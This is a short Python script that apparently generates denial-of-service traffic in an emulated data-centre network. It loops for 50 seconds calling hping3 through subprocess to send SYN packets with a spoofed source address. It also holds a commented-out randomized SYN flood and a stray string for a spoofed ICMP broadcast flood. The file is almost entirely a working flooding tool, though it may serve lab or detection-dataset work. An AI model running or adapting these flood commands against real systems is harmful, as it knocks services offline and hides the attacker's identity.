import os
import sys
import subprocess 
import random
from time import time

interface_list = [f"p{i}_s{j}-eth{k}" for i in range(4) for j in range(2) for k in range(5)]

def tcp_syn_flood(interface_list):
    print(interface_list)
    r1 = random.randint(0, len(interface_list) - 1)
    pod = random.randint(0, 3)
    switch = random.randint(0, 3)
    id = random.randint(3, 4)
    pkt_size = random.randint(20, 100)
    #cmd_str = f"sudo hping3 --rand-source --rand-dest 10.{pod}.{switch}.{id} --interface {interface_list[r1]} -S --flood -p ++21 --data {pkt_size} -c 2"
    cmd_str = "sudo hping3 -a 192.168.3.2 10.0.1.2 -S"
    subprocess.run(cmd_str, shell= True)

    "p1_s1_h3 hping3 --icmp  --flood --spoof p3_s1_h2 255.255.255.255"
    

if __name__ == "__main__":
    t0 = time()
    while(True):
        print("New Packet")
        tcp_syn_flood(interface_list)
        if(time() - t0 > 50):
            break